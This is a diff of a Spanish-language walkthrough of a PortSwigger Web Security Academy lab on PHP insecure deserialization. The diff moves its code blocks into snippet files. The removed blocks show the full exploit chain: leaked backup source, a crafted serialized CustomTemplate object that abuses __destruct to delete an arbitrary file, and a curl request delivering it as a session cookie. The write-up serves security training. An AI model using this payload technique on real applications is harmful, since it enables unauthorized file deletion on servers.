@@ -10,6 +10,7 @@ lang: "es"
 
 import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
 import PartialContainer from '../../../components/PartialContainer.astro';
+import CodeSnippet from '../../../components/CodeSnippet.astro';
 
 ## Conceptos Previos Necesarios Para Resolver El Lab
 
@@ -23,9 +24,7 @@ import PartialContainer from '../../../components/PartialContainer.astro';
 
 Primero exploremos el lab e iniciemos sesión para obtener una cookie de sesión válida:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/login" | cat
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/01-bash.sh" />
 
 > **Desglose del comando**: \
 `-s` = modo silencioso (sin barra de progreso) \
@@ -37,16 +36,11 @@ La página de login tiene un formulario simple sin token CSRF:
 
 También hay un comentario HTML interesante al final de la página:
 
-```html
-<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/02-html.html" />
 
 Esto sugiere un archivo PHP que podría ser interesante. Primero iniciemos sesión:
 
-```bash
-curl -s -D - "https://<lab-url>.web-security-academy.net/login" \
-  -d "username=wiener&password=peter" 2>/dev/null | head -10
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/03-bash.sh" />
 
 > **Desglose del comando**: \
 `-D -` = mostrar cabeceras de respuesta en stdout \
@@ -54,85 +48,30 @@ curl -s -D - "https://<lab-url>.web-security-academy.net/login" \
 
 Respuesta:
 
-```
-HTTP/2 302
-location: /my-account?id=wiener
-set-cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4cWlsb2F0eTZncTBiczZjNnl1NHBwNGZjYmY2dXEzdiI7fQ%3d%3d; Secure; HttpOnly; SameSite=None
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/04-plain.http" />
 
 La cookie de sesión parece ser base64. Vamos a decodificarla:
 
-```bash
-echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4cWlsb2F0eTZncTBiczZjNnl1NHBwNGZjYmY2dXEzdiI7fQ==" | base64 -d
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/05-bash.sh" />
 
 Salida:
 
-```
-O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xqiloaty6gq0bs6c6yu4pp4fcbf6uq3v";}
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/06-plain.txt" />
 
 Este es un **objeto PHP serializado**. El servidor almacena el objeto User completo en la cookie de sesión. Esto significa que controlamos lo que se deserializa en el servidor, lo que puede ser una vulnerabilidad crítica.
 
 Ahora investiguemos ese archivo `CustomTemplate.php` que encontramos en el comentario HTML. Solicitar el archivo PHP directamente simplemente lo ejecutaría, pero podemos intentar obtener el archivo de respaldo añadiendo una tilde (`~`):
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/libs/CustomTemplate.php~" | cat
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/07-bash.sh" />
 
 Respuesta:
 
-```php
-<?php
-
-class CustomTemplate {
-    private $template_file_path;
-    private $lock_file_path;
-
-    public function __construct($template_file_path) {
-        $this->template_file_path = $template_file_path;
-        $this->lock_file_path = $template_file_path . ".lock";
-    }
-
-    private function isTemplateLocked() {
-        return file_exists($this->lock_file_path);
-    }
-
-    public function getTemplate() {
-        return file_get_contents($this->template_file_path);
-    }
-
-    public function saveTemplate($template) {
-        if (!isTemplateLocked()) {
-            if (file_put_contents($this->lock_file_path, "") === false) {
-                throw new Exception("Could not write to " . $this->lock_file_path);
-            }
-            if (file_put_contents($this->template_file_path, $template) === false) {
-                throw new Exception("Could not write to " . $this->template_file_path);
-            }
-        }
-    }
-
-    function __destruct() {
-        // Carlos thought this would be a good idea
-        if (file_exists($this->lock_file_path)) {
-            unlink($this->lock_file_path);
-        }
-    }
-}
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/08-php.php" />
 
 Carlos va a lamentar su idea de usar el método mágico `__destruct()`. \
 Analicemos el papel de este fragmento de código en nuestro ataque:
 
-```php
-function __destruct() {
-    // Carlos thought this would be a good idea
-    if (file_exists($this->lock_file_path)) {
-        unlink($this->lock_file_path);
-    }
-}
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/09-php.php" />
 
 Cuando un objeto `CustomTemplate` es destruido, llama a `unlink()` sobre cualquier ruta almacenada en `$this->lock_file_path`. La función `unlink()` en PHP **elimina un archivo**. Si podemos controlar `lock_file_path`, podemos eliminar cualquier archivo del servidor.
 
@@ -147,9 +86,7 @@ Cuando un objeto `CustomTemplate` es destruido, llama a `unlink()` sobre cualqui
 
 Creemos el payload serializado:
 
-```
-O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/10-plain.txt" />
 
 Desglose:
 - `O:14:"CustomTemplate"` — Objeto de la clase **CustomTemplate** (14 caracteres)
@@ -159,9 +96,7 @@ Desglose:
 
 Ahora codifiquémoslo en base64:
 
-```bash
-echo -n 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}' | base64 -w0
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/11-bash.sh" />
 
 > **Desglose del comando**: \
 `echo -n` = imprimir sin salto de línea final (importante para una codificación base64 limpia) \
@@ -169,16 +104,11 @@ echo -n 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/moral
 
 Salida:
 
-```
-TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/12-plain.txt" />
 
 Ahora enviemos la petición con nuestra cookie de sesión maliciosa:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/my-account?id=wiener" \
-  -b "session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d"
-```
+<CodeSnippet file="php-deserialization-arbitrary-object-injection/13-bash.sh" />
 
 > **Desglose del comando**: \
 `-b "session=..."` = enviar una cookie con la petición. Esto reemplaza la cookie de sesión legítima con nuestro objeto serializado malicioso \
